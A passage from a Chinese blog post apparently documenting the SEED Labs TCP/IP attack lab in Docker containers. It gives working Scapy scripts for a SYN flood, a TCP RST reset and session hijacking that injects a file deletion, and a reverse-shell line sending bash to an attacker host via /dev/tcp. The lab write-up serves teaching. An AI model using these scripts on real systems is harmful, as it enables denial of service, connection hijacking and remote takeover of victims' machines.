Container"></a><strong>2.2 About the Attacker Container</strong></h3><p><a name="Lmxw7"></a></p><h4 id="•-Shared-folder"><a href="#•-Shared-folder" class="headerlink" title="• Shared folder"></a>• <em>Shared folder</em></h4><p>当我们使用攻击者容器来启动攻击时，我们需要将攻击代码放在攻击者容器中。代码编辑在VM中比在容器中更方便，因为我们可以使用我们最喜欢的编辑器。为了让VM和容器共享文件，我们已经使用Docker卷在VM和容器之间创建了一个共享文件夹。如果您查看Docker组成文件，您会发现我们已经在一些容器中添加了以下条目。表示将主机（即VM)上的.&#x2F;volues文件夹装载到容器内的&#x2F;volues文件夹。我们将把代码写入.&#x2F;volous文件夹（在VM上），以便它们可以在容器中使用。<br><a name="LAiS2"></a></p><h4 id="•-Host-mode"><a href="#•-Host-mode" class="headerlink" title="• Host mode"></a>• <em>Host mode</em></h4><p>在这个实验室中，攻击者需要能够嗅探数据包，但在一个容器内运行嗅探程序有问题，因为一个容器是有效地连接到一个虚拟的开关，所以它只能看到自己的流量，它永远不会看到其他容器中的数据包。为了解决这个问题，我们使用了攻击者容器的主机模式。这允许攻击者容器查看所有的流量。在攻击者容器上使用的下列条目如下：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699862046796-34d40ca0-6038-4889-817f-b9c55814149f.png#averageHue=%2323201f&clientId=u57db4859-e4a5-4&from=paste&height=230&id=uf3584fee&originHeight=362&originWidth=647&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=30031&status=done&style=none&taskId=uacb9c441-0b90-4c1d-85b5-f916e649675&title=&width=410.79366944904945" alt="image.png"><br />当容器处于host模式时，它可以看到所有主机的网络接口，它甚至具有与主机具有相同的IP地址。基本上，它与主机虚拟机放在相同的网络名称空间中。但是，容器仍然是一个独立的机器，因为它的其他名称空间仍然与主机不同。</p><p><a name="CBb3M"></a></p><h3 id="2-3-The-seed-Account"><a href="#2-3-The-seed-Account" class="headerlink" title="2.3 The seed Account"></a><strong>2.3 The seed Account</strong></h3><blockquote><p>在这个实验室里，我们需要从一个容器传送到另一个容器。我们已经在所有容器中创建了一个名为seed的帐户。它的密码是参与者。你可以登录这个账户。</p></blockquote><p>这一点与第九次实验”嗅探与欺骗攻击“相同，操作不过多叙述<br><a name="vTOH6"></a></p><h2 id="3-Task-1-SYN-Flooding-Attack"><a href="#3-Task-1-SYN-Flooding-Attack" class="headerlink" title="3 Task 1: SYN Flooding Attack"></a><strong>3 Task 1: SYN Flooding Attack</strong></h2><p>SYN洪泛攻击是一种DoS攻击形式，攻击者向受害者的TCP端口发送许多SYN请求，但攻击者无意完成三方握手过程。攻击者要么使用欺骗的IP地址，要么不继续此过程。通过这次攻击，攻击者可以淹没受害者的用于半开的连接的队列，即已完成SYN、SYN-ACK，但尚未返回最终ACK的连接。当此队列已满时，受害者无法再进行任何连接。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701075832063-ec1ba5c2-5c15-4f35-a86e-257aa6e575ee.png#averageHue=%23fcfcfb&clientId=u14c8f42f-3f6e-4&from=paste&height=260&id=ufe61889a&originHeight=410&originWidth=868&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=71158&status=done&style=none&taskId=u7f8d2b60-ad89-4a93-84a0-47b239bcf1f&title=&width=551.1111361387557" alt="image.png"></p><p>查看ubuntu系统队列大小：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl net.ipv4.tcp_max_syn_backlog</span><br></pre></td></tr></table></figure><p>查看队列使用情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -nat</span><br></pre></td></tr></table></figure><p>我们可以使用命令“netstat-nat”来检查队列的使用情况，即，与一个监听端口相关联的半开连接的数量。这种连接的状态是SYN-RECV。如果完成了三方握手，则将建立连接的状态。</p><p>默认情况下，Ubuntu的SYN洪泛对策已打开。这种机制叫做SYN cookie。如果机器检测到它受到了SYN的洪泛攻击，它就会启动。在我们的受害者服务器容器中，我们已经关闭了它（参见docker-compose.yml文件中的系统转换条目）。我们可以使用以下的sysctl命令来打开和关闭它：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sysctl -a | grep syncookies (Display the SYN cookie flag)</span><br><span class="line">sysctl -w net.ipv4.tcp_syncookies=0 (turn off SYN cookie)</span><br><span class="line">sysctl -w net.ipv4.tcp_syncookies=1 (turn on SYN cookie)</span><br></pre></td></tr></table></figure><p>为了能够使用sysctl来更改容器内的系统变量，容器需要配置为“特权：true”条目（这是我们的受害者服务器的情况）。如果没有此设置，如果我们运行上面的命令，我们将看到以下错误消息。容器没有授予进行更改的权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.tcp_syncookies=1</span><br><span class="line"></span><br><span class="line">sysctl: setting key <span class="string">&quot;net.ipv4.tcp_syncookies&quot;</span>: Read-only file system</span><br></pre></td></tr></table></figure><p><a name="gGXYT"></a></p><h3 id="3-1-Task-1-1-Launching-the-Attack-Using-Python"><a href="#3-1-Task-1-1-Launching-the-Attack-Using-Python" class="headerlink" title="3.1: Task 1.1: Launching the Attack Using Python"></a>3.1: <strong>Task 1.1: Launching the Attack Using Python</strong></h3><p>先查看系统队列大小<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701082160417-15793dff-c1da-4f6b-ba35-3e9effbcb287.png#averageHue=%23282726&clientId=ub58e278d-e437-4&from=paste&height=61&id=ud9a4aff8&originHeight=96&originWidth=721&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=16240&status=done&style=none&taskId=uf3dc1c0e-869e-416d-8aa7-044a849502f&title=&width=457.77779856686965" alt="image.png"><br />查看队列使用情况<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701082224888-182d4e43-4825-4632-8eed-3b671c72fe88.png#averageHue=%23262524&clientId=ub58e278d-e437-4&from=paste&height=382&id=u693504fb&originHeight=601&originWidth=1043&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=80491&status=done&style=none&taskId=u6122c8c0-85df-436f-8785-cefeda7536c&title=&width=662.2222522957629" alt="image.png"><br />检查是否开启了SYN的cookie策略<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701082538561-60645520-327c-4480-891e-695d1b2d8a78.png#averageHue=%232e2b29&clientId=ub58e278d-e437-4&from=paste&height=463&id=ud30b7152&originHeight=729&originWidth=970&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=124216&status=done&style=none&taskId=u00f3d95d-7450-4ad3-97a8-8d8a2aa52a8&title=&width=615.873043841697" alt="image.png"><br />由红色部分可知，已经开启了cookie策略，因此，需要关闭这个SYN cookie策略<br />下面是python的攻击代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> IP, TCP, send</span><br><span class="line"><span class="keyword">from</span> ipaddress <span class="keyword">import</span> IPv4Address</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line">ip = IP(dst=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">tcp = TCP(dport=<span class="number">23</span>, flags=<span class="string">&quot;S&quot;</span>)</span><br><span class="line">pkt = ip/tcp</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">pkt[IP].src = <span class="built_in">str</span>(IPv4Address(getrandbits(<span class="number">32</span>))) <span class="comment"># source iP</span></span><br><span class="line">pkt[TCP].sport = getrandbits(<span class="number">16</span>) <span class="comment"># source port</span></span><br><span class="line">pkt[TCP].seq = getrandbits(<span class="number">32</span>) <span class="comment"># sequence number</span></span><br><span class="line">send(pkt, verbose = <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>这段代码先创建了一个IP数据包对象ip，目的地IP地址设置为”10.9.0.5”。然后，创建了一个TCP数据包对象tcp，指定目的地端口号为23，并设置标志位为SYN。最后，使用ip&#x2F;tcp将IP数据包和TCP数据包组合成一个完整的数据包对象pkt。<br />再使用一个无限循环，不断发送经过修改的数据包pkt。在每次循环中，通过str(IPv4Address(getrandbits(32)))随机生成一个32位的源IP地址，并将其赋值给pkt[IP].src属性。同样地，getrandbits(16)生成一个16位的源端口号，并赋值给pkt[TCP].sport属性。getrandbits(32)生成一个32位的序列号，并赋值给pkt[TCP].seq属性。最后，使用send(pkt, verbose&#x3D;0)发送数据包。</p><p>在攻击开始前，10.9.0.5端口状态是这样的：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701085311506-ccc11ad0-ea6c-4b91-9310-2d31e6dd9781.png#averageHue=%23272625&clientId=ub58e278d-e437-4&from=paste&height=119&id=uf870aa33&originHeight=188&originWidth=1019&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=28218&status=done&style=none&taskId=u51832bb9-101b-4a24-8ddb-81c71283b6f&title=&width=646.984156365659" alt="image.png"><br />执行攻击代码：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701085372946-68edac59-8108-4727-9308-581a1032514e.png#averageHue=%23242323&clientId=ub58e278d-e437-4&from=paste&height=42&id=u2eab7118&originHeight=66&originWidth=733&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=8502&status=done&style=none&taskId=u0a02218a-f3b0-4fe6-8a9a-64f6e428d2d&title=&width=465.39684653192154" alt="image.png"><br />用再查看端口，发现全都变成了半连接状态：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701085413023-d2b04bc3-01e1-453b-8ed2-43e3f87c506b.png#averageHue=%232a2726&clientId=ub58e278d-e437-4&from=paste&height=397&id=uda14358f&originHeight=626&originWidth=987&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=107034&status=done&style=none&taskId=uddb7961f-e65c-46ab-a84f-37d55dada57&title=&width=626.6666951255206" alt="image.png"><br><a name="S7od5"></a></p><h3 id="3-2-Task-1-2-Launch-the-Attack-Using-C"><a href="#3-2-Task-1-2-Launch-the-Attack-Using-C" class="headerlink" title="3.2 Task 1.2: Launch the Attack Using C"></a>3.2 <strong>Task 1.2: Launch the Attack Using C</strong></h3><p>labsetup里面给了c的代码，我们直接执行c的攻击代码：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701083781382-dd3c332d-21c6-4f43-a321-5b4b36ec8a1c.png#averageHue=%23242322&clientId=ub58e278d-e437-4&from=paste&height=140&id=S556L&originHeight=221&originWidth=766&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=37717&status=done&style=none&taskId=u5b4535cc-1904-4e09-8b1e-dbf30e4e0b5&title=&width=486.3492284358143" alt="image.png"><br />用另一个终端页面尝试telnet，发现长时间不能telnet通（因为请求队列已经满了）：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701083729878-e2671dfd-e2fd-498d-9c64-aa012f462215.png#averageHue=%23252524&clientId=ub58e278d-e437-4&from=paste&height=56&id=ENHSG&originHeight=88&originWidth=498&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=8078&status=done&style=none&taskId=ue2b437de-d550-41ea-afdf-801e73164fa&title=&width=316.1904905496548" alt="image.png"><br />先telnet 10.9.0.5 ，再启动攻击<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701083905354-2ede26c4-6e14-4e11-95f2-191bfe3c962f.png#averageHue=%23232322&clientId=ub58e278d-e437-4&from=paste&height=493&id=WfpJE&originHeight=1002&originWidth=1128&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=130048&status=done&style=none&taskId=u2df1a252-f150-4374-a588-61403d88f49&title=&width=555.4603271484375" alt="image.png"><br />用被攻击端的终端查看端口，发现全都变成了半连接状态：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701083992807-a1b27994-9e0f-45a2-9d3a-307df4404b40.png#averageHue=%23292625&clientId=ub58e278d-e437-4&from=paste&height=411&id=cisWf&originHeight=813&originWidth=1084&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=142952&status=done&style=none&taskId=u38b4f862-10db-4458-9821-47307e8ef9a&title=&width=548.4603271484375" alt="image.png"></p><p><a name="hFfE0"></a></p><h3 id="3-3-Task-1-3-Enable-the-SYN-Cookie-Countermeasure"><a href="#3-3-Task-1-3-Enable-the-SYN-Cookie-Countermeasure" class="headerlink" title="3.3 Task 1.3: Enable the SYN Cookie Countermeasure"></a>3.3 <strong>Task 1.3: Enable the SYN Cookie Countermeasure</strong></h3><blockquote><p>请启用SYN cookie机制，并再次运行攻击，并比较结果。</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701085751363-cdebfa7d-c087-4e68-baee-cacf7b19d10f.png#averageHue=%23252423&clientId=ub58e278d-e437-4&from=paste&height=56&id=u97bd3fcc&originHeight=88&originWidth=934&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=18081&status=done&style=none&taskId=u5089d4a1-fd31-404c-90fe-bcbf3220c0d&title=&width=593.0158999465413" alt="image.png"><br />如上进行攻击，发现被攻击者端口状态正常：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701086693130-3784f63b-d15e-4960-9c78-770d272964cb.png#averageHue=%23272625&clientId=ub58e278d-e437-4&from=paste&height=125&id=u28ca1365&originHeight=197&originWidth=1032&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=28366&status=done&style=none&taskId=uff2797fc-a3e6-448c-a038-39cf37edd2d&title=&width=655.2381249944652" alt="image.png"><br><a name="XAZJ8"></a></p><h2 id="4-Task-2-TCP-RST-Attacks-on-telnet-Connections"><a href="#4-Task-2-TCP-RST-Attacks-on-telnet-Connections" class="headerlink" title="4 Task 2: TCP RST Attacks on telnet Connections"></a><strong>4 Task 2: TCP RST Attacks on telnet Connections</strong></h2><blockquote><p>TCP RST攻击可以终止两个受害者之间已建立的TCP连接。例如，如果两个用户A和B之间已建立了telnet连接（TCP），攻击者可以从a到B欺骗一个RST数据包，从而破坏这个现有的连接。为了成功地进行此攻击，攻击者需要正确地构建TCP RST数据包。<br>在此任务中，您需要从虚拟机启动TCP RST攻击，以断开A和B在容器之间现有的远程网络连接。为了简化实验，我们假设攻击者和受害者在同一个局域网上，即攻击者可以观察A和B之间的TCP流量。</p></blockquote><p>大致原理：在tcp连接建立之后，虚拟RST报文，重置当前的tcp连接。因为telnet是基于tcp的，所以RST攻击可以强制中断telnet连接。</p><p>这里我们将victim（10.9.0.5）作为客户端，observer（10.9.0.6）作为服务器，victim（10.9.0.1）使用telnet远程登录observer，接着attacker发送虚拟RST报文中断这个连接。其中的关键就是构造虚拟RST报文，相关信息可以通过wireshark捕获到，下面是实验流程：</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701259588759-18159fdf-4385-412a-8f9d-3c2101f03e93.png#averageHue=%23252524&clientId=u8e75c327-c20b-4&from=paste&height=347&id=u81eb2daa&originHeight=546&originWidth=929&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=62400&status=done&style=none&taskId=ub06b6ad5-5718-4c3d-baa7-bcc4da9c751&title=&width=589.8412966277696" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701260035659-93fe418c-4b89-4444-a791-fb473722460a.png#averageHue=%23262423&clientId=u8e75c327-c20b-4&from=paste&height=327&id=ua9c91a23&originHeight=515&originWidth=1064&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=61446&status=done&style=none&taskId=u1395a869-d5f0-451b-af63-b361e9eeb9c&title=&width=675.5555862346038" alt="image.png"></p><p>在Client与Server通过telnet命令建立了连接之后，在Attacker中通过Wireshark抓包方式，查看二者之间的数据包。在wireshark上可以找到对应的报文信息，我们是想模拟服务器给客户端发送RST报文，所以找的就是最新的服务器发给客户端的报文。注意观察源ip、目的ip、源端口、目的端口，只要确定没有问题了，再看下一条的序列号和ack。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701260502812-c9791b9a-46dd-40c4-b6fe-1bfbbaf13164.png#averageHue=%23c4a17b&clientId=u8e75c327-c20b-4&from=paste&height=377&id=u654e8b4e&originHeight=594&originWidth=965&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=127546&status=done&style=none&taskId=u29db8d8d-e588-41b9-951e-57c09cb0dfc&title=&width=612.6984405229254" alt="image.png"></p><p>构造报文rst.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">ip = IP(src=<span class="string">&quot;10.9.0.6&quot;</span>, dst=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">tcp = TCP(sport=<span class="number">23</span>, dport=<span class="number">36060</span>, flags=<span class="string">&quot;R&quot;</span>, seq=<span class="number">2618195968</span>)</span><br><span class="line">pkt = ip/tcp</span><br><span class="line">ls(pkt)</span><br><span class="line">send(pkt,verbose=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行rst.py，可以看到telnet连接被终止<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701261025005-a24b2270-4a84-4338-90bf-4b1639e1f53b.png#averageHue=%23252423&clientId=u8e75c327-c20b-4&from=paste&height=423&id=u80140a47&originHeight=667&originWidth=2089&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=146519&status=done&style=none&taskId=u9be0fa76-d067-48d0-8eb2-14bd1c0bbb0&title=&width=1326.3492665827887" alt="image.png"><br><a name="MXcjJ"></a></p><h2 id="5-Task-3-TCP-Session-Hijacking"><a href="#5-Task-3-TCP-Session-Hijacking" class="headerlink" title="5 Task 3: TCP Session Hijacking"></a><strong>5 Task 3: TCP Session Hijacking</strong></h2><p>大致原理：在tcp连接建立之后，虚拟ACK报文，发送攻击者的数据。因为telnet是基于tcp的，所以会话劫持攻击可以嵌入攻击者的shell指令。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701263477131-bcec5543-5cbd-4810-9445-b796bf9f8ded.png#averageHue=%23f9f9f9&clientId=u8e75c327-c20b-4&from=paste&height=154&id=u98528ec3&originHeight=389&originWidth=1341&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=21518&status=done&style=none&taskId=uf12c495b-1200-4260-a67a-be8ed098f1f&title=&width=532.4603271484375" alt="image.png"><br />这里我们将victim（10.9.0.7）作为客户端，observer（10.9.0.5）作为服务器，服务器上有个文件new.txt，victim使用telnet远程登录observer，接着attacker（10.9.0.1）发送虚拟ACK报文删除new.txt。其中的关键就是构造虚拟RST报文，相关信息可以通过wireshark捕获到，下面是实验流程：<br />先在服务器（10.9.0.5）上创建文件:<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701411928627-0a17e5e6-ee1c-4c49-ab97-0015a77b15d0.png#averageHue=%23272624&clientId=ubb13e4a3-8d5e-4&from=paste&height=142&id=ufba2a96f&originHeight=224&originWidth=606&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=31896&status=done&style=none&taskId=u05c77866-eaf5-4a86-9115-1ab5b9bbbc0&title=&width=384.76192223512203" alt="image.png"><br />客户端（10.9.0.7）远程登录服务器（10.9.0.5）并查看文件new.txt：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701412027606-f144fe65-daff-4c70-8e67-373e94f39ef0.png#averageHue=%23252322&clientId=ubb13e4a3-8d5e-4&from=paste&height=307&id=ubacdf2b5&originHeight=631&originWidth=1134&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=75441&status=done&style=none&taskId=u44b4df3e-8218-476d-a6fd-7cf435ab454&title=&width=551.4603271484375" alt="image.png"></p><p>查看最后一条报文，获取ip、port、seq、ack：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701412135146-8ffbda76-7143-41db-a70e-e3cad28b98db.png#averageHue=%23be9a75&clientId=ubb13e4a3-8d5e-4&from=paste&height=347&id=uc09a2f8b&originHeight=546&originWidth=1194&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=118911&status=done&style=none&taskId=u68ca00bc-9488-4980-9a24-2d2f6391eca&title=&width=758.0952725226663" alt="image.png"></p><p>构造Hijack.c：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">ip = IP(src=<span class="string">&quot;10.9.0.7&quot;</span>, dst=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">tcp = TCP(sport=<span class="number">49668</span>, dport=<span class="number">23</span>, flags=<span class="string">&quot;A&quot;</span>, seq=<span class="number">2572525453</span>, ack=<span class="number">1402443012</span>)</span><br><span class="line">data = <span class="string">&quot;rm -rf new.txt&quot;</span></span><br><span class="line">pkt = ip/tcp/data</span><br><span class="line">ls(pkt)</span><br><span class="line">send(pkt, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行攻击代码:<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701412215799-03fe98c5-6653-459a-8bb8-5d4bb71b17ea.png#averageHue=%23242322&clientId=ubb13e4a3-8d5e-4&from=paste&height=502&id=uc4e219b7&originHeight=790&originWidth=1110&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=108357&status=done&style=none&taskId=u247d7042-62d8-47c2-ba14-4e3a2ccf325&title=&width=704.7619367673028" alt="image.png"><br />服务端文件不见了：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701412517205-1ebd69fa-ffbe-4fb9-8aa7-681712989a1d.png#averageHue=%23262524&clientId=ubb13e4a3-8d5e-4&from=paste&height=172&id=u6ff4af92&originHeight=222&originWidth=787&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=34708&status=done&style=none&taskId=u373105cc-dab0-45fa-be2e-5ae034d3939&title=&width=608.6825561523438" alt="image.png"><br />客户端光标锁死：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701412611509-66836495-fe18-4a87-a720-ae4104fd7e44.png#averageHue=%232b2725&clientId=ubb13e4a3-8d5e-4&from=paste&height=113&id=uff7d3b72&originHeight=178&originWidth=814&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=10265&status=done&style=none&taskId=u97fc7ac0-0b59-4f38-84c1-e1135718af9&title=&width=516.825420296022" alt="53557cc64b6876edb8fbf165739a673e.png"></p><p>结果发现：文件删除成功，并且客户端的光标被锁死，无法输入命令（这个是因为客户端的终端失去了正确的ack与seq，既无法发出信息，也无法接收信息，甚至无法退出。）<br><a name="cA8HW"></a></p><h2 id="6-Task-4-Creating-Reverse-Shell-using-TCP-Session-Hijacking"><a href="#6-Task-4-Creating-Reverse-Shell-using-TCP-Session-Hijacking" class="headerlink" title="6 Task 4: Creating Reverse Shell using TCP Session Hijacking"></a><strong>6 Task 4: Creating Reverse Shell using TCP Session Hijacking</strong></h2><blockquote><p>当攻击者能够使用TCP会话劫持向受害者的机器注入命令时，他们对在受害者机器上运行一个简单的命令不感兴趣；他们对运行许多命令感兴趣。显然，通过TCP会话劫持来运行这些命令是不方便的。攻击者想要实现的是利用攻击来设置一个后门，这样他们就可以使用这个后门来方便地进行进一步的破坏。设置后门的一个典型方法是从受害者机器上运行一个反向炮弹，让攻击者的炮弹进入受害者机器。反向shell是一个在远程机器上运行的shell进程，它可以连接回攻击者的机器。这为攻击者提供了一种方便的方式来访问远程计算机。</p></blockquote><p>反向shell，即是攻击者通过nc建立一个tcp server，然后在会话劫持的基础上，可以让受害者执行命令把shell通过nc的端口反弹回攻击者的主机中，从而拿到了受害者机器的执行权限。<br />首先在Attacker中开启监听9090端口，从Server中反射回的shell会通过9090端口返回回来。此处nc命令的使用是表示在Attacker中开启的是9090端口，也就是相当于启动了一个tcp服务，此服务监听了从9090端口输入进来的内容。</p><p>10.9.0.1作为attacker：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701422677002-674a9587-2cda-4a15-911b-95258add574e.png#averageHue=%231a1918&clientId=ubb13e4a3-8d5e-4&from=paste&height=60&id=uf37ab6ff&originHeight=94&originWidth=1060&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=17646&status=done&style=none&taskId=u171b0a3d-60ae-45c4-86ae-674065f69cb&title=&width=673.0159035795864" alt="image.png"></p><p>在客户机（10.9.0.6）上telent服务器（10.9.0.7）；<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701415406113-41d71448-354a-4461-be26-e8004767926e.png#averageHue=%23252323&clientId=ubb13e4a3-8d5e-4&from=paste&height=378&id=u10b09a70&originHeight=595&originWidth=1219&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=82357&status=done&style=none&taskId=ud668fcb8-500c-416e-9d9f-376c2bcb8ac&title=&width=773.9682891165244" alt="image.png"></p><p>在wireshark上可以找到最新的报文信息，最新的是客户端发给服务器的，那我们模拟客户端再发一条，只需要改变序列号就好了<img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701422633566-ccaebf4b-ef39-43c4-87f5-1c09992393f2.png#averageHue=%23c2a07c&clientId=ubb13e4a3-8d5e-4&from=paste&height=315&id=ubc82232e&originHeight=600&originWidth=1050&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=141145&status=done&style=none&taskId=ud7557bb3-0461-4db0-9ae2-551149346a1&title=&width=550.4127197265625" alt="image.png"></p><p>reshell.py代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = IP(src=<span class="string">&quot;10.9.0.6&quot;</span>, dst=<span class="string">&quot;10.9.0.7&quot;</span>)</span><br><span class="line">tcp = TCP(sport=<span class="number">41522</span>, dport=<span class="number">23</span>, flags=<span class="string">&quot;A&quot;</span>, seq=<span class="number">2309604794</span>, ack=<span class="number">2535698582</span>)</span><br><span class="line">data = <span class="string">&quot; /bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1\r&quot;</span></span><br><span class="line">pkt = ip/tcp/data</span><br><span class="line"><span class="comment"># ls(pkt)</span></span><br><span class="line">send(pkt, verbose=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>结果：攻击者与服务器建立了连接，成功拿到 victim 的 shell，比如使用ifconfig命令查看ip，接下来攻击者就可以为所欲为了<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701422542378-d934659f-e925-4e20-acd9-3f2fd7ec1641.png#averageHue=%230f0c0b&clientId=ubb13e4a3-8d5e-4&from=paste&height=268&id=ub8a76fb1&originHeight=492&originWidth=1055&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=103010&status=done&style=none&taskId=u6a60537c-a3b4-4743-9588-1bb76eed6d8&title=&width=575.4127197265625" alt="image.png"></p><p>:::info<br><strong>文件描述符概念：</strong><br />标准输入为0，标准输出为1，标准错误输出为2。<br />&amp;1是标准输出文件的主机。0&lt;&amp;1是将标准输入由标准输出的主机输入。2&gt;&amp;1是将标准错误输出到标准输出的主机上。也就是说shell的输入输出都是由攻击者来控制的了。因此就可以实现了远程控制反弹shell。<br>:::<br><br /></p>]]></content>
      
      
      <categories>
          
          <category> seedlab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seedlab TCP IP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEEDLAB：网络嗅探攻击实验</title>
      <link href="/post/4f4694a6.html"/>
      <url>/post/4f4694a6.html</url>
      
